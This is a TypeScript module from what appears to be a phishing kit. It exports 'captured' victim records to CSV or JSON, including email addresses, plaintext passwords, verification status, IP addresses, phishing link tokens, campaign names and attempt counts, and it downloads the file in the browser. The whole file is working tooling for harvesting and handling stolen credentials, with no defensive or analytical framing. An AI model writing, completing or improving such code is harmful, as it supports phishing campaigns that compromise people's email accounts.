/**
 * Export utilities for captures
 */

import type { CapturedEmail } from './linkDatabase'

/**
 * Export captures to CSV format
 */
export function exportToCSV(captures: CapturedEmail[]): string {
  if (captures.length === 0) {
    return 'No data to export'
  }

  // CSV Headers
  const headers = [
    'Email',
    'Password',
    'Provider',
    'Verified',
    'IP Address',
    'Location',
    'Device',
    'Browser',
    'Link Token',
    'Link Type',
    'Campaign',
    'Captured At',
    'Attempts',
    'MX Record',
  ]

  // CSV Rows
  const rows = captures.map((capture) => {
    // Get password (first attempt or all attempts joined)
    const password = capture.passwords && capture.passwords.length > 0
      ? capture.passwords[0] // Use first password, or join all: capture.passwords.join(' | ')
      : 'N/A'

    // Format timestamp
    const timestamp = new Date(capture.capturedAt).toLocaleString('en-US', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
    })

    return [
      escapeCSV(capture.email),
      escapeCSV(password),
      escapeCSV(capture.provider || 'Unknown'),
      capture.verified ? 'Yes' : 'No',
      escapeCSV(capture.ip || 'Unknown'),
      'Unknown', // Location - would need IP geolocation
      'Unknown', // Device - would need user agent parsing
      'Unknown', // Browser - would need user agent parsing
      escapeCSV(capture.sessionIdentifier || capture.linkToken || 'N/A'),
      escapeCSV(capture.linkType),
      escapeCSV(capture.linkName || 'N/A'),
      escapeCSV(timestamp),
      capture.attempts.toString(),
      escapeCSV(capture.mxRecord || 'Unknown'),
    ]
  })

  // Combine headers and rows
  const csvContent = [headers, ...rows]
    .map((row) => row.join(','))
    .join('\n')

  return csvContent
}

/**
 * Export captures to JSON format
 */
export function exportToJSON(captures: CapturedEmail[]): string {
  return JSON.stringify(captures, null, 2)
}

/**
 * Escape CSV field (handle commas, quotes, newlines)
 */
function escapeCSV(field: string): string {
  if (field === null || field === undefined) {
    return ''
  }

  const stringField = String(field)

  // If field contains comma, quote, or newline, wrap in quotes and escape quotes
  if (stringField.includes(',') || stringField.includes('"') || stringField.includes('\n')) {
    return `"${stringField.replace(/"/g, '""')}"`
  }

  return stringField
}

/**
 * Download file helper
 */
export function downloadFile(content: string, filename: string, mimeType: string) {
  const blob = new Blob([content], { type: mimeType })
  const url = URL.createObjectURL(blob)
  const link = document.createElement('a')
  link.href = url
  link.download = filename
  document.body.appendChild(link)
  link.click()
  document.body.removeChild(link)
  URL.revokeObjectURL(url)
}



